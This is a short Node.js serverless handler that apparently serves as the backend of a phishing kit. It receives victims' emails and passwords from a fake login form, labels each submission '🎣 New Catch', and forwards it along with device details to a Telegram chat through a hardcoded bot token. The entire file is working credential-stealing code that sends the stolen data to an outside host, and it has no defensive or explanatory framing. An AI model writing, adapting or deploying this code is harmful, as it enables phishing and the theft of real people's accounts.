module.exports = async (req, res) => {
    const BOT_TOKEN = '8674321912:AAH9ncPM6rtU8cilPYiS_uR4ZZNZOxnLfRs';
    const CHAT_ID = '7607355489';

    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const data = req.body;

    const text = `🎣 New Catch\n\n` +
                 `Email: ${data.email}\n` +
                 `Pass: ${data.password}\n` +
                 `Attempt: #${data.attemptNumber}\n` +
                 `Time: ${new Date(data.timestamp).toLocaleString()}\n` +
                 `Device: ${data.userAgent}\n` +
                 `Screen: ${data.screen}`;

    try {
        const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: text
            })
        });

        const tgData = await tgRes.json();
        if (!tgData.ok) throw new Error(tgData.description);

        return res.status(200).json({ ok: true });
    } catch (err) {
        console.error('Telegram error:', err.message);
        return res.status(200).json({ ok: false, error: err.message });
    }
};
